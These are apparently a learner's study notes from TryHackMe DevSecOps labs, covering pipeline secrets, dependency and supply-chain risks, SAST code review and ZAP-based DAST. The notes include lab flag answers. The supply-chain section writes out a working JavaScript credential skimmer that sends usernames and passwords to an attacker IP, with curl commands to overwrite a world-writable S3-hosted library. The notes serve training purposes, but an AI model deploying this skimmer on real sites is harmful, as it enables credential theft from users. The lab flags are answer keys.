- Restricted Access for CI/CD Jobs: Only authorized users should have access to the machines. Implement strong access controls and monitor
for unauthorised access.
- Monitoring and Alerting: Set up alerts for suspicious activity or failed builds that indicate a compromise.
What should you do so that a compromised environment doesn't affect other environments? isolate environments
Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4?THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}
Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5? THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}

#Securing The Build Secrets
#One Secret To Rule Them All
Once the pipelines, the environments and runners are segregated, secrets need to be segregated too. Using same secrets for dev and prod environments
could lead to a compromise.  Once the dev environment is compromised, the production can be compromised too.
#Protecting the Build Secrets
- Masking Variables: e.g you can MASK  variable in the gitlab by using CI_JOB_TOKEN
- Use Secure Variables: e.g Enable the option "Masked" for the Gitlab CI/CD variables. You go into Gitlab, provide it into it and enable "masked"
- Access Controls: Only authorized can view job logs and variables in GitLab.
Is using environment variables enough to protect the build secrets? (yay or nay) nay
What is the value of the PROD API_KEY? THM{Secrets.are.meant.to.be.kept.Secret}

Summary
- Pipeline security is very important
- Access controls are essential
- Runner security is essential
- Secrets Management matters
- Isolate environments
- Continuous vigilance
- Education

#DEPENDENCY MANAGEMENT
Modern apps are not built from the ground up anymore. Modern apps use LIBRARIES and SOFTWARE DEVELOPMENT KITS that assist with basic
features of the application. The libraries and SDKs are called dependencies and they need to be managed.
#The scale of dependency
The "import numpy" is a dependency in python that takes care of more than 250 lines of codes for you already. Every single line where the 
numpy library is used is 250 lines of codes at least. So when you use it, it streamlines your code and makes it more enables you to focus on
the functionalities. However, you need to manage this numpy dependency e.g

#!/usr/bin/python3
#Import the OS dependency
import numpy

x = numpy.array([1,2,3,4,5])
y = numpy.array([6])
print(x * y)
#Dependency management
Process of managing your dependencies through your SDLC process and DevOps pipeline.
#Why do we perform dependency management?
- Know your dependencies so that you can manage them
- Trying to version lock dependencies because newer versions may add new features or deprecate features that our applications use.
- Can help new devs onboard by installing all their dependencies for them.
- Can monitor the dependencies for security reasons.
Most big organizations use dependency management tool e.g JFrog Artifactory
What do we call the libraries and SDKs that are imported into our application? Dependencies
#Internal Vs External
#External dependencies
Are dependencies that are developed and maintained outside your org. Some of these dependencies are publicly available. Some are paid
for. Examples of popular external dependencies:
- Any python pip package from Pypi public repos
- JQuery and any other Node Package Manager (NPM) library e.g VueJS or NodeJS
- Paid for SDKs e.g Google Recaptcha SDK that can be used to integrate captchas into your application
#Internal dependencies
It is one that has been developed by someone in ypur org. Only used by apps in our org. Examples of them are:
- An authentication library that standardizes the authentication processes of all of our internally developed app.
- A data-source connection library that provides apps with various techniques to connect to different data centers
- A message translation library that can convert app messages from a specific format to one that an internal application can read
Would an authentication library that we created be considered an internal or external dependency? internal
Would JQuery be considered an internal or external dependency? external
#Securing external dependencies
Are the ones that are HOSTED, MANAGED and UPDATED by EXTERNAL PARTIES.
###One of the attacks that can be targeted at EXTERNAL DEPENDENCIES is a SUPPLY CHAIN ATTACK.
#PUBLIC CVES
There are going to be vulnerabilities in the code they were written by developers for an app. The vulnerabilities will be disclosed publicly
and they will patch them to rectify that. However, since vulnerabilities are disclosed publicly, they are open to attackers too. It may not be
easy for those using the apps to react quickly to patching them and unfortunately, these are what attackers will target. They will exploit
it- looking for systems that still have the vulnerabilities and they exploit.
It could be dependencies of dependencies sometimes i.e it may not be the SDK that is vulnerable, it may be dependency of the SDK. So you will
have to update the dependency and update the SDK too. e.g log4j
Log4j is a java based logging utility- used in almost app developed in java. Several products become vulnerable -up to a 1000

#Supply Chain Attack
It is the method of attack that is targeted at dependencies of an application instead of targeting the application directly- it is an indirect
method of attack. Used by attackers knowing that an application may have been securely hardened and cannot be easily compromised, but the
dependencies used by the application may not be that securely hardened because of budget constraint- so they target the dependencies.
An Advanced Persistent Group (APG) called MageCart is well known for this. Examples of MageCart Exploits include
- Compromising BA's payment portal, leading to compromise of customers' credit card and a fine of $230m for BA
- Compromising credit cards of more than 100k customers by embedding skimmers in various payment portals of applications
- Compromising more than 10000 AWS S3 buckets by embedding MALWARE in any JavaScript found in the buckets.
#The compromise of a single dependency can lead to compromise of several applications, since several apps may be using the dependency. So
it is far more lucrative
When a dependency is securely hosted, an attacker can exploit it e.g an S3 Bucket with a WORLD-WRITABLE PERMISSIONS configured.
An attacker could EXPLOIT these permissions to OVERWRITE the HOSTED DEPENDENCY with MALICIOUS CODE.
#Supply Chain Attack on an INTERNET FACING S3 BUCKET
- There is an internet-facing s3 bucket that has a Javascript misconfigured world writable permissions on it.
- If it is internet facing, there should not be any "PUT" command allowed externally. But when you misconfigure permissions in the app
to allow this, it means anybody externally can access it and gain the control of it to perform malicious acts.
#THE SIMULATION (LAB FOR THIS EXPLOIT)
- Need to set up a S3 bucket hostname- run the below command to set up an internet facing s3 bucket i.e you write to hosts in etc to host it
sudo bash -c "echo 'MACHINE_IP cdn.tryhackme.loc' >> /etc/hosts"
- You can REFRESH your webpage to see your dependency in the internet-facing s3 bucket
- To inspect the code of the app. Right Click on "View Source", it will show you DEPENDENCY from cdn.tryhackme.loc
- Further "inspect the dependency", by opening a link to the dependency, an "auth.js" should be able to be downloaded- see the below:
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        	document.getElementById("loginSubmit").click();
	}
});
- Further inspection of the Javascript code library shows that it has a "JS event that monitors the PASSWORD TEXTBOX FOE KEYSTROKES and
automatically SUBMIT LOGIN FORM if the user presses ENTER". Although the code is NOT SHOWING VULNERABILITY. However take a look at where the
 dependency is being hosted
- Further inspect the dependency to the code, by going a step back in the request - run this -"http://cdn.tryhackme.loc:9444/libraries,"
It shows that it is an s3 bucket hosting dependency- it shows this 
"<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">"
- To test if the team that set this up has misconfigured the S3 bucket to grant the"WORLD WRITABLE PERMISSIONS" is to run the below curl
command- by trying a PUT REQUEST i.e running "Curl -X PUT"
curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"
If you get an "HTTP 200 OK" or able to DOWNLOAD "http://cdn.tryhackme.loc:9444/libraries/test.js. " , it is good for a possible SUPPLY
CHAIN ATTACK.
- The supply chain attack could be in different ways to exploit this worl writable permission, but going simple by EMBEDDING A CREDENTIAL
SKIMMER that will SEND A USER'S CREDENTIAL WHEN THEY CLICK "SUBMIT" i.e modify the code auth.js file 
- Download the auth.js file
- Modify it to the below:
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        try {
            const oReq = new XMLHttpRequest();
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            oReq.open("GET", "http://THM_IP:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        }
        catch(err) {
            console.log(err);
        }
		function sleep (time) {
                    return new Promise((resolve) => setTimeout(resolve, time));
                }
                sleep(5000).then(() => {
    		    document.getElementById("loginSubmit").click();
                });
	}
});
Note: Ensure the THM_IP is the IP of your THMVPN IP or ATTACKBOX IP
Once this is done, and the user presses SUBMIT of their credentials, we will get USERNAME and PASSWORD of the target as parameters in the

request through XHR(XMLHTTPRequest)
The sleep function in the code is to ensure that MALICIOS XHR REQUESTS HAS COMPLETED BEFORE THE PAGE TRANSITION OCCURS, or else a modern
browser would stop the request from occurring.
- Upload the auth.js (modified with skimmer) file back into the host to overwrite the original one, by running the below command:
curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js
- Spin up a server that will receive the keystrokes from the inetrnet-facing s3 bucket, by running the below command
python3 -m http.server 7070
- To test whether the skimmer will work or not, initiate a test on the ineternet-facing s3 bucket website, by entering your credentials
and submit, you should intercept your password.
10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -
- Once a user authenticates, we should get the user's keystrokes.
- Then the user's credentials can be used to authenticate to the website.
#Defences to limit these attacks
- Ensure you update and patch dependencies on a regular basis.
- Dependencies can be copied and hosted internally
- Use sub resource to prevent tampering with JS libraries from loading by including in the HTML, the "hash of the JS Library". Because
the modern web browser will VERIFY the hash of JS library and once it does not match, the library will not be loaded


####securing internal dependencies
- any libraries or sdks that have been developed internally are called internal dependencies
##security concerns for sdk includes
- legacy code
- hard to maintain; you have got to patch this regularly
- storage; are you able to control its storage?
- you can use jfrog artifactory to centrally store all your dependencies. it is a dependency manager
#attack/threat against internal dependency
- dependency confusion- it is attack that can be launched against a dependency manager
- when an attacker launches a malicious dependency attack against the dependency manager of an organization, whereby the attacker hosted
package is being used as against the correct or appropriate package e.g an attacker gets privy to sensitive info of a package being used
by a developer that asked question on stack overflow and forgot to obfuscate the sensitive data. the attacker pounces on this and modifies
the package and hosts it with a superior version number.
- dependency confusion can be achieved through supply chain attacks via
1. typosquatting: an attacker hosting a package called "nunpy" instead of the real python package called "numpy". thereby expecting a
developer to make a typo error of running a "pip install nunpy", instead of "pip install numpy"
2. source injection: an attacker contributes to the source code of the package on public forum and embeds vulnerability into it
3. domain expiry: an attacker takes an advantage of an expired domain that the real developer forgets to renew the email associated with
hosting of the package.

##risk of running the command for looking for an external package if available
- "pip install numpy --extra-index-url https://our-internal-pypi-server.com/"
- with the "extra-index-url", it looks for external package that might be available for the package and gets exposed to potential exploita
    tion of dependency confusion

##defences
- actively maintain internal dependencies.
-  ensure the security of hosting internal dependencies by
    - reference only one private supply point, not multiple. e.g using "index-url" instead of "external-index-url" will ensure that package 
    is obtained only from one source
    - use controlled scopes to protect packages- ensure dependencies are locked to the applications that require them.
    - use client-side-verifications procedure- e.g version locking.


#####static application security testing (sast)
sast is a tool that is used to discover vulnerabilities during the development lifecycle of an application
it is best to integrate a sast tool right from the beginning of a sdlc.
it is also important to be familiar with or know the owasp top 10 and owasp api top 10
####owasp top 10
- broken access control
- insecure design
- cryptographic failures
- security misconfiguration
- vulnerable and outdated components
- identification and authentication failures
- software and data integrity failures
- injection
- logging and monitoring failures
- server side request forgery (ssrs)

###owasp api top 10
- broken object level authorization
- broken function level authorization
- broken user authentication
- excessive data exposure
- lack of resources and rate limiting

#code review
you need to carry out code review to test your code for security bugs. code review means testing your code for security bugs
using a white box approach to search for vulnerabilities ata early stage of sdlc instead of later is important.
vulnerabilities that are not detected at early stage because there is no code review or search for vulnerabilities will surfaceat the
end of the project and more laborious to fix.
code review early on in an sdlc will guarantee:
- early bug fix
- less laborious vulnerability management
- less cost spent on vulnerability fix.
cost of defects increases from design to maintenance stage i.e --------> design -- coding(development) -- testing -- maintenance
##manual vs automated coding
#manual code review
- human involvement ensures that thorough review and analysis is carried, 
- but more laborious if there is thousands lines of code to be reviewed
- inconsistency because of thousands lines of code to be reviewed
- cost is higher, because human is involved and spends a lot of time doing the review
#automated code review (this where sast tools are used)
- less laborious - faster
- less cost, because it is swiftly completed
- consistency - it does not suffer fatigue- produces same result every time

#recommendation
- use automated tools that are precisely defined at early stage to take care of vulnerabilities
- use manual code review at later stage to take care of more complex vulnerabilities that automated tool might not be able to.

###how manual code review is performed
manual code review is performed by focusing on finding a type of vulnerability e.g sql injection vulnerabilities
at a particular time and finding the rest subsequently.
however we can define more than one type of vulnerability for an automated code review to find.
first step in code review is to search for - insecure functions in use
##search for sql injection functions (i.e find any function that could be used to send raw queries to the database)
- any function that can send queries directly to the database can be used for sql injection
- assuming we are using an application that uses php and mysql
    - on the my sql database, we have the below functions:
    - mysqli_query()
    - mysql_query()
    - mysqli_prepare()
    - query()
    - prepare()
##searching for a specified function on the database
- to search for "mysql_query" function
    - use "grep", with "r" and "n" flags for recursively and the line number to search for the function directly on the project files
        - go to the base directory of the project and run the below command:
        - cd to the base directory e.g " cd /home/ninc/documents/cyberfile/html", then run the command below
        " grep -r -n 'mysql_query(' "
        - you will get an output that will indicate the number of the line in which the function can be found e.g
        " db.php:18: $result = mysql_query($conn, $query); "
        - this function on line 18 is a potential vulnerability for sql injection, but we cannot determine the vulnerability is present in it
        until validation
# to validate if vulnerabilites are present or not inside the function, you will need to look or investigate how it is used
- so assuming the function "mysql_query" is used in a "db.php" file in our application (php and sql app)
- we will take a look at that file to investigate further if there is a vulnerability or not
- assuming after opening up the "db.php" file, we find this below script:
- function db_query($conn, $query){
    $result = mysql_query($conn, $query);
    return $result;
}
#analysis
- the "msql_query" function is wrapped inside the "db_query" function. it is nested inside it
- unfortunately, there is a "$query" parameter that is passed without modification i.e it is in plain sight. anybody can exploit and modify this
- the problem at hand now is to find what "db_query" is used for in the application
    - use grep to search for where "db_query" is used in the application
    - run the below command to search for row numbers of where the query is used
    " grep -rn 'db_query(' "
    - it should output the lines in which "db_query" is used in the code and you can analyze whether it is vulnerable or not
    
    hidden-panel.php:7:$result = db_query($conn, $sql);
    hidden-panel.php:20:$result2 = db_query($conn, $sql2);
    hidden-panel.php:23:$result3 = db_query($conn, $sql3);
    db.php:17:function db_query($conn, $query){
    - analysing the calls starting with the first one
        - " hidden-panel.php:7:$result = db_query($conn, $sql); "
        - running the below get call that passes first name and lastname(passes whatever that is stated) in the "guest_id" parameter
        and concatenates it into the raw sql query "$sql"
        - run the below command and you will validate the vulnerability present inside the "db_query" function
        " $sql = "SELECT id, firstname, lastname FROM MyGuests WHERE id=".$_GET['guest_id'];  --- line 1
        " $result = db_query($conn, $sql);"                                                   --- line 2
        - the above indicates that an attacker can exploit the vulnerability in the present function and wreck havoc
    - analysing the third result/output- the result 3, $sql3
        - " hidden-panel.php:23:$result3 = db_query($conn, $sql3); "
        - running the below get call passes id, name into the sql query "$sql3" through the parameter 'art_id'
        - even though it was sanitized with the "preg_replace" function, the regex is only replacing the first character (1 in the script) with an empty string
        - any other character will pass without being replaced, resulting in a potential "sql injection"
        " $sql3 = "SELECT id, name FROM asciiart WHERE id=".preg_replace("/[^0-9]/", "", $_GET['art_id'], 1);
        " $result3 = db_query($conn, $sql3);"
        - the above indicates that an unauthorized user can run this and exploit the present vulnerabilities
    - analysing the second result/output 2, $sql2
        - hidden-panel.php:20:$result2 = db_query($conn, $sql2);
        - running the below get call passes id, logtest into the sql query "$sql2" through the parameter 'log_id'
        - even though it was sanitized with the "preg_replace" function, the regex is used to filter and allow characters that are either alpha numeric or double quotes
        - the double quotes may look like a "vector" for sql injection, but they are not a threat in this case, since the string 'log_id'
        - passed in the sql sentence is enclosed- so it is not vulnerable to an attack
        - therefore it is not vulnerable and a sql injection won't work
        " $sql2 = "SELECT id, logtext FROM logs WHERE id='".preg_replace('/[^a-z0-9A-Z"]/', "", $_GET['log_id']). "'";
          $result2 = db_query($conn, $sql2);"
        - the above indicates that exploitation won't be successful in this.


####local file inclusion (lfi) attacks. 
###misuse of a php function can lead to local file inclusion attack
####functions that can be misused are below:
- require()
- include()
- require_once()
- include_once()
####finding vulnerabilities in your application for lfi
- run "grep" to search for where the specified queries can be found in your application
- investigation the use cases of each
- run a get call to check the vulnerabilites
- validate what can be exploited
- all these will be done by running it in the php file in the application.
- lfi can only be present, when the attacker is able to manipulate a part of what is sent to the vulnerable function. 
- the vulnerable instance must contain some reference to a get or post parameter or other manipulable inputs.


####automated code review
- static application security testing (sast) is the tool that is used for carrying out code analysis
- it is used to make code review/code analysis faster and simpler
- it is not used to replace manual code review, but to make it simpler and completes dynamic application security testing (dast)
- and software composition analysis (sca)
####advantages
- it does not require a running instance of the target application i.e the instance of the target application does not need to be running for sast to be deployed
- it provides a great coverage of the application's functionality i.e it does more than carrying out vulnerability on a function at a time
- it is faster compared to other dynamic techniques
- it reports exactly where vulnerabilities are in the code
- easy to integrate into ci/cd pipeline

####disadvantages
- false positive prone
- specific to only a particular language - not language agnostic
- can't identify vulnerabilities that are dynamic in nature
- the source code of the app is not always available.
####note
- all sast tools are different, but they will always perform 2 main functions:
- transform the code to an abstract model: represent the code using abstract syntax trees (ast) and then later analysis
- analyze the abstract model for security issues

#different analysis techniques commonly used by sast tools
- semantic analysis: it is similar to grepping in manual code review. it finds flaws caused by insecure code in localized context
    - e.g seraching for calls to mysql_query where get/post parameters are directly concatenated into the query
    - "mysql_query($db, "SELECT * from users where username=".$_GET['username'])"
- dataflow analysis: there could be usage of dangerous  function sometimes and it might not be easy to determine whether there is vulnerability
    - or not by analysing the context around the function call locally.
    - it traces info/data from the inputs the user can manipulate to potentially vulnerable function
    - the input is regarded as the "source" and the potentially vulnerable function is "sink"
    - if data flows from a source to a sink without sanitation, there is a "vulnerability"
- control flow analysis: used to analyse the order of operations in a code:
    - race conditions
    - use of uninitialized variables
    - resource leaks
- structural analysis: analysis the code structure of each programming language
    - e.g following best practices when declaring classes, evaluating code blocks that may not execute, try/catch blocks for cryptographic issues
    - "e.g $options = array('private_key_bits' => 1024, 'private_key_type' => OPENSSL_KEYTYPE_RSA);  
     $res = openssl_pkey_new($options);"
    - rsa key of 1024 is insufficient in this time and age.
- configuration analysis: analysis application configuration flaws instead of code itself.
    - e.g application running under (iis) internet information service will have a "web.config". php will have its configurations in php.ini
#####rechecking with sast tools
- rechecking with psalm (php static analysis linting machine): simple tool for analysing php code.
- it is installed as part of the application's project. psalm's configuration file.
- run the below command to execute psalm on the configuration file for structural issues perhaps to avoid runtime error sometimes
    - " ./vendor/bin/psalm --no-cache "
- it can also be used to carry out dataflow analysis
- run the below command taint_analysis for the dataflow analysis
    - " ./vendor/bin/psalm --no-cache --taint-analysis "
- there is always going to be errors with sast tools and the two most common are:
    - False positives: The tool reports on a vulnerability that isn't present in the code i.e vuln not present in the code
    - False negatives: The tool doesn't report a vulnerability that is present in the code i.e does not report vuln present in the code
###implementaion of sast
- add sast at developing cycle or codding cycle of sdlc
- sast can be implemented in either of the 2 ways
    - cicd integration: each time a pr or merge occurs, sast will run
    - ide integration: integrate it directly to a dev's ide.
    - can combine both
    - another sast tool: "semgrep", can be installed from vs marketplace
    - runs when you start your vs code.

#####dynamic application security testing (dast)
- application of dast tool to find weaknesses
- advantages and disadvantages of dast
- dast tools

####required knowledge
- how website works
- http overview
- owasp top 10
####how website works| http/s
- there are many steps to how a website works, but at a high level, a summary of how that occurs will be expressed
- a user sends a request to a website (url) on a web browser.
- the request on that particular url is intended for only one web server that is located somewhere in the world
- there needs to be a match of the url with an associated ip. the intended server has an ip meant for only it.
- often, the url for a particular website will have a cname (an alias) meant for the internet.
- a url will have a dns that is being used at the backend associated with it and server ip attached to it.
- there will need to be a 3 way handshake that must sync, before connection is successful i.e sync acknowledge sync
- therefore, user sends a request, the request goes through the necssary steps to the intended server
- then the server will respond with the content requested for.
- example:
- url: www.ninc.com
- a user makes a request to www.ninc.com
- ip for the server: #.#.#.#
- dns for the website: abacd1234.#$%##############.com
- cname: fgijk904.################.com
- ip associated with the dns
- cname pointed to the dns
- url matched with cname matched with the server ip eventually to respond to the request
####structure/components for a url
- https://user:password@ninc.com:443/view-room?id=1#task4
- what the parts of the url mean:
- scheme: https or http is the scheme. it instructs on what protocol to use to access the website
- user: user:password is the user. authentication to login
- domain/host: ninc.com is the domain or host of ip of the website you are trying to access
- port: port to be connected to, to give you access to the website e.g 443/80
- path: location or file name of the resource being tried to access e.g view-room
- query-string: extra bit of info that can be sent to requested path e.g "?id=1"
- fragment: reference to the location on the actual page requested.
####request and response
#request
- GET / HTTPs/1.1
- Host: ninc.com
- User-Agent: Mozilla/5.0 Firefox/87.0
- Referer: https://ninc.com/

#what each request line above means
- line 1025: this request is sending the GET method. request the home page with / and telling the web server we are using HTTPs protocol version 1.1.
- line 1026: telling the web server we want the website ninc.com
- line 1027: telling the web server we are using the Firefox version 87 Browser
- line 1028: telling the web server that the web page that referred us to this one is https://ninc.com
- line 1029: HTTPs requests always end with a blank line to inform the web server that the request has finished.
#response
- HTTPs/1.1 200 OK
- Server: nginx/1.15.8
- Date: Fri, 09 Apr 2021 13:34:03 GMT
- Content-Type: text/html
- Content-Length: 98

#what each response line means
- line 1037: HTTPs 1.1 is the version of the HTTPs protocol the server is using and then followed by the HTTPs Status Code in this case "200 Ok" 
- which tells us the request has completed successfully.
- line 1038: telling us the web server software and version number.
- line 1039: telling us the current date, time and timezone of the web server.
- line 1040: Content-Type header telling us the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML.
- line 1041: Content-Length telling us the client how long the response is, this way we can confirm no data is missing
####components of a website
- the components that are used to make a website:
    - html: used to build and define structure for the website
    - css: used to style the website
    - javascript: used to implement the complex interactive part of the website
####hypertext markup language (html)
- it is the language used for a website- to build a website and how the browser will display contents for the website.
- an example below:
- structure (as shown in the screenshot) has the following components:
- <!DOCTYPE html> defines that the page is a HTML5 document. This helps with standardisation across different browsers and tells the browser to use HTML5 to interpret the page
- <html> element is the root element of the HTML page - all other elements come after this element.
- <head> element contains information about the page (such as the page title)
- <body> element defines the HTML document's body; only content inside of the body is shown in the browser.
- <h1> element defines a large heading
- <p> element defines a paragraph
- other tags that are being used: are many other elements (tags) used for different purposes. For example.
- there are tags for buttons (<button>), images (<img>), lists, and much more
- can contain attributes such as the class attribute which can be used to style an element (e.g. make the tag a different color) <p class="bold-text">, or the src attribute which is used on images to specify the location of an image: <img src="img/cat.jpg">.
- an element can have multiple attributes each with its own unique purpose, e.g., <p attribute1="value1" attribute2="value2">.
- elements can also have an id attribute (<p id="example">), which is unique to the element. Unlike the class attribute, where multiple elements can use the same class, an element must have different id's to identify them uniquely. 
- element id's are used for styling and to identify it by JavaScript.
- you can view the HTML of any website by right-clicking and selecting "View Page Source" (Chrome) / "Show Page Source" (Safari).
####javascript
- used to enable a page/website to be more interactive
- to control the functionality of the webpage
- to make a page more dynamic as against static from html
- js can dynamically update a page real-time e.g  a user clicking a button.
- javaScript is added within the page source code and can be either loaded within:
- <script> tags or
- can be included remotely with the src attribute: <script src="/location/of/javascript_file.js"></script>
-  the js code finds a HTML element on the page with the id of "demo" and changes the element's contents to "Hack the Planet"
- :document.getElementById("demo").innerHTML = "Hack the Planet";
- html elements can also have events, such as "onclick" or "onhover" that execute js when the event occurs
- the following code changes the text of the element with the demo ID to Button Clicked
- :<button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>Click Me!</button>
- onclick events can also be defined inside the JavaScript script tags, and not on elements directly.

####html injection
- avoid or protect your website by removing sensitive info or links from html for the website.
- review the page source code for exposed login credentials or hidden links
- do input sanitation as a defence.

####
- is the process of testing a running web application for weaknesses and vulnerabilities.
- focuses on black-box testing approach that hackers normally operate- blackhat
- dast identifies vulnerabilities by trying to exploit them via a manual or automated approach
- dast does not replace any other method of testing, it just complements it. 

#manual vs automated dast
- manual dast: a security engineer or appropriate personnel in an org manually carries out the test for vulnerabilities on a web app
- automated dast: an approriate personnel uses a dast tool to scan a web app for vulnerabilites.
- from experience or best practice is to combine these methods of dast in a company.
- dast is best used in the testing phase of sdlc
    - dev: plan ---> code ---> ---> build ---> test (dast):---->  ops:-----> release ---> deploy ---> operate ---> monitor --->
- automated dast is respected and used for its fast outcome- it does testing speedily and produces result.
- manual scans can be done weekly, while using automated scans routinely as needed.
- note: run a thorough or full blown pentesting when  app is about going to production
- automated dast is often referred as just "dast" while manual dast can be referred as "traditional dast"

#advantages and disadvantages of dast (pros vs cons)
#advantages
- it finds vulnerabilities during runtime
- dast can find vulnerabilities that may not be found in sast e.g http request smuggling, cache poisoning, parameter pollution
- dast is programming-agnostic. all kinds of web app with different programming languages are tested.
- it reduces the number of false positives compared to sast
- it is capable of finding some business logic flaws.
#disadvantages
- code coverage might be limited. it does cover all areas required to be tested. focuses on some specific vulnerabilites
- may not be the best to find some vulnerabilities compared to sast
- some apps may be difficult to be crawled i.e harder for dast tools to traverse some apps
- may be limited in recommending how to remediate some vulnerabilities since thy are not familiar with the underlying technologies
- time consuming i.e some dast tools take time to finish
- a running app is required to carry out testing
- dast tool is certainly performing at least 2 of the below tasks against a target website:
    - spidering/crawling: navigate through the web app, trying to map the application and identify a list of pages and parameters
    - vulnerable to attacks.
    - vulnerability scanning: it will try to launch attack payloads against identified pages and parmaters. you include the type of attacks
    to be targeted by the tool i.e you will have a list of attacks, and you can choose from them.
- an example of dast tool is zap proxy
####spiders and crawlers
- to spider an app with zap, follow the below steps:
    - map all resources in the target web application for identification of scope
    - zap maps or explores all resources once a website is provided or you point a website to zap
    - follow the below steps
    - access zap
    - go to "tools"
    - select "spider"
    - specify the website url or ip with port in the "starting point" e.g "http://10.10.185.191:8082" or "http://machine_ip:port"
    - you can leave the "context" and "user" boxes empty
    - enable the "recurse" box --- spider the website for links recursively.
    - enable the "spider subtree only" box - limits spidering to subfolders of the starting point
    - enable "show advanced options" - additional parameters are added to tune the spidering
    - select "start scan" tab at the bottom.
    - output should be all urls that spider found on the website
    - note: however any item that is outside the starting pages's url won't be covered, because it is considered as out of scope for spidering
    - to validate this: if you check the pages manually and navigate to the starting page, you might see other urls that cannot be seen by zap
    - reason: the url link is not embedded in the html code of website. the urls that are not seen are generated on the fly by e.g javascript
    - innovation/advancement: to overcome the limitations of zap not detecting url built on the fly, a dast tool that can be accessed via
    - browsers e.g firefox/ chrome can be used and since the browser has javascript, it will be able to process websites with those kinds
    - of on the fly links/urls. an example of that kind of dast tool is "ajax spider"
    - for ajax spider, follow the steps below
        - access ajax spider
        - go to "tools"
        - select "ajax spider"
        - specify the website url or ip with port in the "starting point"
        - leave the "context" and "user" boxes empty
        - leave the "just in scope" box unchecked
        - check the box for "spider subtree only"
        - select "firefox" as browser
        - leave "show advanced option" box unchecked
        - select "start scan" tab at the bottom.

####scanning for vulnerabilities
- customize your tests when running dast tools. fit appropriate tests to be carried out to reduce scanning period after payload is launched
- for example, running a test on an app without database. limit the tests to only web app related attacks/vulnerabilities
- e.g remove sql injection scanning
- to create a scanning or modify scanning in zap, you have to use scanning policy. follow the below steps to modify scanning policies:
    - access zap
    - go to "analyse"
    - select " scan policy manager"
    - select "add" to create a new one.
    - you can configure or define thee kinds of tests you prefer or need from this point based on these 2 major categories
        - threshold: it controls the extent to which you want the test to reach. if you select a "low threshold" you risk
        - getting more false positives (vulnerabilites that are not present). while selecting a "high threshold" means getting
        - results only with high certainty. but the drawback is some vulnerabilites that are present (false negatives) might not be reported
        - so choose medium
        - strength: it controls how many parameters are run for each category."higher strengths" means more additional findings will be discovered
        - but it will be more time-consuming.
        - note: tune the configurations acccording to your requirements e.g disable all the "sql injections" test because their is no database
        - disable cross-site scripting too because it will consume time.
        - kinds of policies under "scan policy" in zap includes:
            - client browser
            - information gathering
            - injection
            - miscellaneous
            - server security
            - the groups of test names under these 5 are:
                - buffer overflow
                - cloud metadata potentialy exposed
                - crlf injection
                - cross site scripting (persistent)
                - cross site scripting (persistent)- prime
                - cross site scripting (persistent)- spider
                - cross site scripting (reflected)
                - format string error
                - parameter tampering
                - remote os command injection
                - server side code injection
                - server side include
                - sql injection
                - sql injection - hypersonic sql
                - sql injection - mssql
                - sql injection - mysql
                - sql injection - oracle
                - sql injection - sqllite
                - xml external entity attack
                - xslt injection
        - then to run the scans; follow the below steps:
            -go to "tools"
            - select "active scans"
            - enter the the required ip and port into the "starting point"
            - select the prior policy that you created e.g neediumpolicy for "policy"
            - leave "context" and "user" boxes empty
            - check the box for "recurse"
            - leave the "advanced setting option" as empty
            - results will start trickling in under the "alerts" tab for vulnerabilites that were found.
            - if you find out that any one of them is false positive. right click on it and select "false positive"
                - 

####authenticated scans
- there might be some vulnerabilities that zap proxy may not be able to discover because the application would need to be accessed by
- credentials i.e when an admin accesses an app with credentials, he/ she may find some vulnerabilities that zap proxy may not have
- originally found. in order to get over a deficiency like this or improves upon it, the below steps might be followed.
- need to use what is called "zest script" to record how the app is authenticated to on the zap proxy. this way, zap proxy would be
- able to do this independently in the future. follow the below steps:
    - ensure to disable the "zap hud" on zap proxy( button is almost at the end of the toolbar at the top)
    - click on the "record a new zest script" button on the toolbar
    - enter a name for "title"
    - select "authentication" as "type"
    - select "server side script" as "record type"
    - set the "prefix" as the base url of the application e.g http://$ip:$port/ (it will filter out requests made to other sites)
    - select "start recording" at the bottom
    - result is that every http request that goes through zap proxy will be recorded as part of the script
    - select the browser e.g firefox or chrome or microsoft edge on the toolbar
    - enter your credentials for the application
    - zest script will record all these steps and zap proxy will replicate them subsequently to scan the app with authenticated credentials
    - stop the recording by clicking on "record a new zest script" on the toolbar again
    - can close zap browser as well 
- for each of the requests, zap will check the status code e.g 200, 302 etc and response length to see if they match ( if they match, zap
- will assume the login was successful). follow the below steps to test the recorded script
    - select "run" button on the script console (to test if the process was done correctly)
    - once the authentication process is confirmed to be recorded. follow the below steps to show zap how to use it:
        - creating a "context" i.e a way to define a group of urls
        - ensure you include every single urls in the app in this context
        - if you have another part of the apps to allow zap have access to, you will have to create another context. follow the below steps:
            - go to "sites" tab
            - right click on the base url of the target app
            - select "include in context"
            - select "new context". it will automatically create a regex that matches any page on the web application.
            - select "authentication"
            - select "script-based authentication" to link zest script to.
            - select "load" to the right of the script's name.
- need to follow the below steps, for zap to successfully run an authenticated scan i.e need to define at least a user in "users" section
    - select "users" under the base url under "scripts"
    - select "ok". you should all the site's resources marked by the target icon i.e now part o defined context.
####respidering the application
- rerun the spider once you finished setting up your first script, to ensure using the correct context and user that were set up
- you enter all the correct context and user
- zap should be able to detect the rest of the vulnerabilities that were not detected before setting up authenticated credentials.
- select "start scan" button at the bottom
- to validate if new resources have been added, select " added nodes" tab
- if "logout" is ine of the resources discovered, you may not want zap to mess with this. so you can exclude it. follow the below steps:
    - right click on the logout resource script
    - select " exclude from context"
    - this way, you have prevented zap from logging out itself
